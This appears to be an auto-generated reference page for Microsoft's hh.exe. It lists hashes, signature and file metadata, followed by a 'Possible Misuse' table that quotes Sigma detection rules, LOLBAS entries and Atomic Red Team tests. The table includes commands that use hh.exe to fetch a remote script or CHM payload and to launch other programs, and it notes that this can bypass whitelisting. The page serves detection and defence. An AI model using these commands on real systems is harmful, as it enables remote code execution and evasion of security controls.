---
title: hh.exe | Microsoft HTML Help Executable
---

# hh.exe 

* File Path: `C:\windows\SysWOW64\hh.exe`
* Description: Microsoft HTML Help Executable
* Comments: 

## Screenshot

![hh.exe](screenshots/hh.exe-52AFE6DE5E463B7A08C184B1EB49DD6A-1.png)

## Hashes

Type | Hash
-- | --
MD5 | `A97778801ABF79482E757200E4035A01`
SHA1 | `F9EED275D9D1D432F2ECDE6B5A9DA08C783B2B2A`
SHA256 | `974C70FA3CAFB802CCA0A4D2D01A84FACB9CF66C8EDFC5F69D3514BB5488783D`
SHA384 | `9ED2B71B70825D7D0B87C1E174B6804A47A4CF1CF4BEB4BA8B03C0CE7D160168DB8286116B7367A022FBCA5A4C611E8B`
SHA512 | `D1C946214875CCE5F0BC597329BD9F68FCCB5F83064888D6EF551314E0E5B10F6DE909E6FD0917D3E55A8F559A23D23DBB1B9573A0B1DC6605C57B2A5A45B02C`
SSDEEP | `192:KCeaZNtjK0Cd0tNSwyRLoOVR4kBGJ1KDJD/4Wcgk:Sat+0eUSwyRUSzA1KDWWcg`

## Runtime Data

### Usage (stdout):
```Batchfile

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: HH.exe.mui
* Product Name: HTML Help
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\hh.exe](hh.exe-1CECEE8D02A8E9B19D3A1A65C7A2B249.md) | 46
[C:\Windows\hh.exe](hh.exe-2C8FE78D53C8CA27523A71DFD2938241.md) | 35
[C:\Windows\hh.exe](hh.exe-52AFE6DE5E463B7A08C184B1EB49DD6A.md) | 36
[C:\windows\hh.exe](hh.exe-B934411DFE7DEACFA95A1255A48133C9.md) | 35
[C:\WINDOWS\hh.exe](hh.exe-DF73D52FDCE65F90A2E49EFB5248C77C.md) | 35
[C:\WINDOWS\SysWOW64\hh.exe](hh.exe-1DDFACDAC1875864336F7B61A7E562C9.md) | 63
[C:\Windows\SysWOW64\hh.exe](hh.exe-25DA176935752443FE077C2F0F819B7E.md) | 50
[C:\Windows\SysWOW64\hh.exe](hh.exe-7AA22C33D8C35E6F59ADB2D02C8702C7.md) | 44
[C:\windows\SysWOW64\hh.exe](hh.exe-ED2E7B5224BA827838C012C26A561DDB.md) | 40

## Possible Misuse

*The following table contains possible examples of `hh.exe` being misused. While `hh.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `title: HH.exe Execution` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `description: Identifies usage of hh.exe executing recently modified .chm files.` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `        Image\|endswith: '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `        ParentImage: 'C:\Windows\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `            - '*\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `Name: Hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe http://some.url/script.ps1` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe c:\windows\system32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `    Usecase: Execute process with HH.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\System32\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\SysWOW64\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | ` - IOC: hh.exe should normally not be in use on a normal workstation` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | <blockquote>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a local compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{local_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a remote compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{remote_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


